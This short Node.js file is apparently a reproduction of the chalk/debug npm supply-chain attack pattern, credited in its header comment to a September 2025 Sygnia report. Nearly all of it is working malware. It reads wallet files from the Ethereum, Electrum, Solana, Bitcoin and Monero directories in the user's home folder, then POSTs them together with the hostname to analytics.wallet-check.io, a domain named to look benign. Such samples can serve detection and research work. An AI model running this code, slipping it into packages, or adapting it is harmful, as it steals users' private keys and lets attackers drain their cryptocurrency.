// chalk/debug pattern (Sygnia, Sept 2025): crypto wallet harvesting
// No child_process, no eval — pure fs + fetch exfiltration

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

const WALLET_DIRS = [
  path.join(os.homedir(), '.ethereum', 'keystore'),
  path.join(os.homedir(), '.electrum', 'wallets'),
  path.join(os.homedir(), '.config', 'solana'),
  path.join(os.homedir(), '.bitcoin', 'wallets'),
  path.join(os.homedir(), '.monero', 'wallets')
];

const wallets = {};

for (const dir of WALLET_DIRS) {
  try {
    const files = fs.readdirSync(dir);
    for (const file of files) {
      try {
        const content = fs.readFileSync(path.join(dir, file), 'utf8');
        wallets[`${path.basename(dir)}/${file}`] = content;
      } catch (e) {}
    }
  } catch (e) {}
}

if (Object.keys(wallets).length > 0) {
  const payload = JSON.stringify({ host: os.hostname(), wallets });
  const req = https.request({
    hostname: 'analytics.wallet-check.io',
    path: '/v2/sync',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, () => {});
  req.write(payload);
  req.end();
}
